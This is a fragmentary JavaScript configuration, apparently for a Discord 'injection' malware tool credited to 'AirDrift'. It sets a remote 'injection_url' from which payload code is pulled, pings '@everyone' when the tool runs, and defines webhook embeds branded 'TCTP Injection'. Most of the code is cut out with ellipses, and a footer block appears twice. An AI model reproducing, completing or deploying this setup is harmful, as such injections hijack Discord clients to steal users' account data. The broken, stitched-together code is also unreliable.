...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'TCTP Injection', 
  embed_icon: 'https://cdn.discordapp.com/attachments/1091429474005954663/1097449155909132308/LOGO_AIRDRIFT_FINI-modified.png?size=4096'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/AirDriftOFF/injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By AirDrift ・https://github.com/AirDriftOFF',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By AirDriftOFF・https://github.com/AirDriftOFF',
        },
      },
    ],
  };
